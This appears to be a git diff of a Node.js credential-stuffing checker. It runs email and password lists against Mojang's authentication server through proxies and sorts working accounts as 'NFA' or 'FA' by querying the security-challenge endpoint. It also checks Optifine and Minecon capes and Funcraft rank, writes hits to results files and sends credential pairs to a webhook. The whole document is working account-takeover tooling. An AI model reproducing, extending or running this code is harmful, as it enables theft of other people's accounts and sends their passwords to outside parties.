@@ -9,69 +9,88 @@ const axios = require('axios-https-proxy-fix');
 const funcraft = require('funcraft');
 const fs = require('fs');
 const async = require("async");
-const { EventEmitter } = require("events");
+const {
+    EventEmitter
+} = require("events");
 
 let s = require("../index.js")
 
+function createUUID(trimmedUUID) {
+    return trimmedUUID.substr(0, 8) + '-' + trimmedUUID.substr(8, 4) + '-' + trimmedUUID.substr(12, 4) + '-' + trimmedUUID.substr(16, 4) + '-' + trimmedUUID.substr(20);
+}
+
 module.exports.throwBadMojang = async (options) => {
-    if(s.def.overviewmode) console.log(`[${new Date().toLocaleTimeString("fr-FR")}] [${chalk.red("BAD")}] ${options.mail}:${options.password}${options.proxy ? ` | Proxy: ${options.proxy.ip}:${options.proxy.port}` : ""}`)
+    if (s.def.overviewmode) console.log(`[${new Date().toLocaleTimeString("fr-FR")}] [${chalk.red("BAD")}] ${options.mail}:${options.password}${options.proxy ? ` | Proxy: ${options.proxy.ip}:${options.proxy.port}` : ""}`)
 
     fs.appendFile('./results/bad.txt', `${options.mail}:${options.password}\n`, async () => {})
-    s.def.stats.badMojang++
+    s.def.bad.mc++
     if (s.def.webhookClient) s.def.webhookClient.send(`[${new Date().toLocaleTimeString("fr-FR")}] [BAD] ${options.mail}:${options.password}${options.proxy ? ` | Proxy: ${options.proxy.ip}:${options.proxy.port}` : ""}`)
 }
 
 module.exports.throwBadMFA = async (options) => {
-    if(s.def.overviewmode) console.log(`[${new Date().toLocaleTimeString("fr-FR")}] [${chalk.red("BAD-MFA")}] ${options.mail}:${options.password}${options.proxy ? ` | Proxy: ${options.proxy.ip}:${options.proxy.port}` : ""}`)
+    if (s.def.overviewmode) console.log(`[${new Date().toLocaleTimeString("fr-FR")}] [${chalk.red("BAD-MFA")}] ${options.mail}:${options.password}${options.proxy ? ` | Proxy: ${options.proxy.ip}:${options.proxy.port}` : ""}`)
 
     fs.appendFile(`./results/mfa/bad.txt`, `${options.mail}:${options.password}\n`, async () => {})
+    s.def.bad.mfa++
     if (s.def.webhookClient) s.def.webhookClient.send(`[${new Date().toLocaleTimeString("fr-FR")}] [BAD-MFA] ${options.mail}:${options.password}${options.proxy ? ` | Proxy: ${options.proxy.ip}:${options.proxy.port}` : ""}`)
 }
 
 module.exports.throwBadFC = async (options) => {
-    if (options.neverConnected) if(s.def.overviewmode)  console.log(`[${new Date().toLocaleTimeString("fr-FR")}] [${chalk.red("BAD-FC")}] ${options.mail}:${options.password} Username: ${options.username}${options.proxy ? ` | Proxy: ${options.proxy.ip}:${options.proxy.port}` : ""} | Never Connected`)
-    if (options.rank) if(s.def.overviewmode) console.log(`[${new Date().toLocaleTimeString("fr-FR")}] [${chalk.red("BAD-FC")}] ${options.mail}:${options.password} Username: ${options.username}${options.proxy ? ` | Proxy: ${options.proxy.ip}:${options.proxy.port}` : ""} | Rank: Default`)
-    s.def.stats.badFC++
+    if (options.neverConnected)
+        if (s.def.overviewmode) console.log(`[${new Date().toLocaleTimeString("fr-FR")}] [${chalk.red("BAD-FC")}] ${options.mail}:${options.password} Username: ${options.username}${options.proxy ? ` | Proxy: ${options.proxy.ip}:${options.proxy.port}` : ""} | Never Connected`)
+    if (options.rank)
+        if (s.def.overviewmode) console.log(`[${new Date().toLocaleTimeString("fr-FR")}] [${chalk.red("BAD-FC")}] ${options.mail}:${options.password} Username: ${options.username}${options.proxy ? ` | Proxy: ${options.proxy.ip}:${options.proxy.port}` : ""} | Rank: Default`)
+    s.def.bad.funcraft++
 
     if (s.def.webhookClient && options.neverConnected) s.def.webhookClient.send(`[${new Date().toLocaleTimeString("fr-FR")}] [BAD-FC] ${options.mail}:${options.password} Username: ${options.username}${options.proxy ? ` | Proxy: ${options.proxy.ip}:${options.proxy.port}` : ""} | Never Connected`)
     if (s.def.webhookClient && options.rank) s.def.webhookClient.send(`[${new Date().toLocaleTimeString("fr-FR")}] [BAD-FC] ${options.mail}:${options.password} Username: ${options.username}${options.proxy ? ` | Proxy: ${options.proxy.ip}:${options.proxy.port}` : ""} | Rank: Default`)
 }
 
 module.exports.throwBadOF = async (options) => {
-    if(s.def.overviewmode) console.log(`[${new Date().toLocaleTimeString("fr-FR")}] [${chalk.red("BAD-OF")}] ${options.mail}:${options.password} Username: ${options.username}${options.proxy ? ` | Proxy: ${options.proxy.ip}:${options.proxy.port}` : ""}`)
+    if (s.def.overviewmode) console.log(`[${new Date().toLocaleTimeString("fr-FR")}] [${chalk.red("BAD-OF")}] ${options.mail}:${options.password} Username: ${options.username}${options.proxy ? ` | Proxy: ${options.proxy.ip}:${options.proxy.port}` : ""}`)
 
     fs.appendFile('./results/optifine/bad.txt', `${options.mail}:${options.password}\n`, async () => {})
 
-    s.def.stats.badOF++
+    s.def.bad.optifine++
 
     if (s.def.webhookClient) s.def.webhookClient.send(`[${new Date().toLocaleTimeString("fr-FR")}] [${chalk.red("BAD-OF")}] ${options.mail}:${options.password} Username: ${options.username}${options.proxy ? ` | Proxy: ${options.proxy.ip}:${options.proxy.port}` : ""}`)
 
 }
 
 module.exports.throwHitMojang = async (options) => {
-    if(s.def.overviewmode) console.log(`[${new Date().toLocaleTimeString("fr-FR")}] [${chalk.green("HIT")}] ${options.mail}:${options.password} Username: ${options.username}${options.proxy ? ` | Proxy: ${options.proxy.ip}:${options.proxy.port}` : ""}`)
+    if (s.def.overviewmode) console.log(`[${new Date().toLocaleTimeString("fr-FR")}] [${chalk.green(`HIT-${options.type}`)}] ${options.mail}:${options.password} Username: ${options.username}${options.proxy ? ` | Proxy: ${options.proxy.ip}:${options.proxy.port}` : ""}`)
 
     fs.appendFile(`./results/hit.txt`, `${options.mail}:${options.password}\n`, async () => {})
 
-    s.def.stats.hitMojang++
+    s.def.hit[options.type.toLowerCase()]++
+}
+
+module.exports.throwHitFC = async (options) => {
+    if (s.def.overviewmode) console.log(`[${new Date().toLocaleTimeString("fr-FR")}] [${chalk.green("HIT-FC")}] ${options.mail}:${options.password} Username: ${options.username}${options.proxy ? ` | Proxy: ${options.proxy.ip}:${options.proxy.port}` : ""} | Rank: ${options.rank}`)
+
+    fs.appendFile(`./results/funcraft/hit.txt`, `${options.mail}:${options.password}\n`, async () => {})
+
+    s.def.hit.funcraft++
 }
 
 module.exports.throwHitMFA = async (options) => {
-    if(s.def.overviewmode) if (options.mail.toLowerCase().includes("gmail")) console.log(`[${new Date().toLocaleTimeString("fr-FR")}] [${chalk.red("HIT-MFA")}] Type: GMail ${options.mail}:${options.password}${options.proxy ? ` | Proxy: ${options.proxy.ip}:${options.proxy.port}` : ""}`)
-    if(s.def.overviewmode) if (options.mail.toLowerCase().includes("ymail" || "yahoo")) console.log(`[${new Date().toLocaleTimeString("fr-FR")}] [${chalk.red("HIT-MFA")}] Type: Yahoo ${options.mail}:${options.password}${options.proxy ? ` | Proxy: ${options.proxy.ip}:${options.proxy.port}` : ""}`)
-    if(s.def.overviewmode) if (options.mail.toLowerCase().includes("live" || "hotmail" || "outlook")) console.log(`[${new Date().toLocaleTimeString("fr-FR")}] [${chalk.red("HIT-MFA")}] Type: Microsoft ${options.mail}:${options.password}${options.proxy ? ` | Proxy: ${options.proxy.ip}:${options.proxy.port}` : ""}`)
+    if (s.def.overviewmode)
+        if (options.mail.toLowerCase().includes("gmail")) console.log(`[${new Date().toLocaleTimeString("fr-FR")}] [${chalk.red("HIT-MFA")}] Type: GMail ${options.mail}:${options.password}${options.proxy ? ` | Proxy: ${options.proxy.ip}:${options.proxy.port}` : ""}`)
+    if (s.def.overviewmode)
+        if (options.mail.toLowerCase().includes("ymail" || "yahoo")) console.log(`[${new Date().toLocaleTimeString("fr-FR")}] [${chalk.red("HIT-MFA")}] Type: Yahoo ${options.mail}:${options.password}${options.proxy ? ` | Proxy: ${options.proxy.ip}:${options.proxy.port}` : ""}`)
+    if (s.def.overviewmode)
+        if (options.mail.toLowerCase().includes("live" || "hotmail" || "outlook")) console.log(`[${new Date().toLocaleTimeString("fr-FR")}] [${chalk.red("HIT-MFA")}] Type: Microsoft ${options.mail}:${options.password}${options.proxy ? ` | Proxy: ${options.proxy.ip}:${options.proxy.port}` : ""}`)
 
     fs.appendFile(`./results/mfa/${options.mail.split("@")[0].split(".")[0]}.txt`, `${options.mail}:${options.password}\n`, async () => {})
 
-    s.def.stats.hitMFA++
+    s.def.hit.mfa++
 }
 
 module.exports.throwHitOF = async (options) => {
-    if(s.def.overviewmode) console.log(`[${new Date().toLocaleTimeString("fr-FR")}] [${chalk.green("HIT-OF")}] ${options.mail}:${options.password} Username: ${options.username}${options.proxy ? ` | Proxy: ${options.proxy.ip}:${options.proxy.port}` : ""} | Optifine Cape Link: ${options.link}`)
+    if (s.def.overviewmode) console.log(`[${new Date().toLocaleTimeString("fr-FR")}] [${chalk.green("HIT-OF")}] ${options.mail}:${options.password} Username: ${options.username}${options.proxy ? ` | Proxy: ${options.proxy.ip}:${options.proxy.port}` : ""} | Optifine Cape Link: ${options.link}`)
 
     fs.appendFile(`./results/optifine/hit.txt`, `${options.mail}:${options.password}\n`, async () => {})
-
-    s.def.stats.hitOF++
+    s.def.hit.optifine++
 }
 
 module.exports.checkConfig = async (options) => {
@@ -105,10 +124,23 @@ module.exports.checkMFA = async (options) => {
 
 module.exports.checkOptifine = async (options) => {
     let r = new Promise(async (resolve, reject) => {
-        request(`http://s.optifine.net/capes/${encodeURIComponent(options.username)}.png`, async (error, response, body) => {
+        request(`http://s.optifine.net/capes/${options.username}.png`, async (error, response, body) => {
             if (body.includes("Not found")) {
                 resolve(false)
-            } else if (!body.includes("Not found") && Buffer.isBuffer(body)) {
+            } else {
+                resolve(true)
+            }
+        })
+    })
+    return r
+}
+
+module.exports.checkMinecon = async (options) => {
+    let r = new Promise(async (resolve, reject) => {
+        request(`https://crafatar.com/capes/${options.uuid}`, async (error, response, body) => {
+            if (Number(response.statusCode) === 404) {
+                resolve(false)
+            } else {
                 resolve(true)
             }
         })
@@ -134,14 +166,15 @@ module.exports.checkFuncraft = async (options) => {
 }
 
 module.exports.checkMojang = (options) => {
+    //console.log(options)
     let startRequest = (config) => {
         let payload = {
             'agent': {
                 'name': 'Minecraft',
                 'version': 1
             },
-            'username': encodeURIComponent(options.mail),
-            'password': encodeURIComponent(options.password),
+            'username': options.mail,
+            'password': options.password,
             'requestUser': true
         }
 
@@ -170,23 +203,48 @@ module.exports.checkMojang = (options) => {
                         useProxy: false
                     })
 
-
                     body = JSON.parse(body)
 
-                    if (body.errorMessage.includes("Invalid credentials")) {
+                    if (body.errorMessage && body.errorMessage.includes("Invalid credentials")) {
                         return resolve(false)
                     }
-                    resolve({
-                        mail: options.mail,
-                        username: body.selectedProfile.name,
-                        password: options.password,
-                        id: body.user.id
+
+                    request({
+                        url: 'https://api.mojang.com/user/security/challenges',
+                        method: 'GET',
+                        headers: {
+                            "Content-Type": "application/json",
+                            'Pragma': 'no-cache',
+                            'User-Agent': config.UserAgent,
+                            "Authorization": `Bearer ${body.accessToken}`
+                        }
+                    }, async (error, response, bbody) => {
+
+                        if (bbody.includes("question") && bbody.includes("answer")) {
+                            resolve({
+                                type: 'NFA',
+                                mail: options.mail,
+                                uuid: createUUID(body.selectedProfile.id),
+                                username: body.selectedProfile.name,
+                                password: options.password,
+                                id: body.user.id
+                            })
+                        } else {
+                            resolve({
+                                type: 'FA',
+                                mail: options.mail,
+                                uuid: createUUID(body.selectedProfile.id),
+                                username: body.selectedProfile.name,
+                                password: options.password,
+                                id: body.user.id
+                            })
+                        }
                     })
                 })
             })
             return r
         } else {
-            let r = new Promise( (resolve, reject) => {
+            let r = new Promise((resolve, reject) => {
                 const config = require("../config.json")
                 request({
                     'url': 'https://authserver.mojang.com/authenticate',
@@ -209,17 +267,41 @@ module.exports.checkMojang = (options) => {
                     if (!body) return startRequest({
                         useProxy: false
                     })
-                    
+
                     body = JSON.parse(body)
 
-                    if (body.errorMessage.includes("Invalid credentials")) {
+                    if (body.errorMessage && body.errorMessage.includes("Invalid credentials")) {
                         return resolve(false)
                     }
-                    resolve({
-                        mail: options.mail,
-                        username: body.selectedProfile.name,
-                        password: options.password,
-                        id: body.user.id
+
+                    request({
+                        url: 'https://api.mojang.com/user/security/challenges',
+                        method: 'GET',
+                        headers: {
+                            "Content-Type": "application/json",
+                            'Pragma': 'no-cache',
+                            'User-Agent': config.UserAgent,
+                            "Authorization": `Bearer ${body.accessToken}`
+                        }
+                    }, async (error, response, bbody) => {
+
+                        if (bbody.includes("question") && bbody.includes("answer")) {
+                            resolve({
+                                type: 'NFA',
+                                mail: options.mail,
+                                username: body.selectedProfile.name,
+                                password: options.password,
+                                id: body.user.id
+                            })
+                        } else {
+                            resolve({
+                                type: 'FA',
+                                mail: options.mail,
+                                username: body.selectedProfile.name,
+                                password: options.password,
+                                id: body.user.id
+                            })
+                        }
                     })
                 })
             })
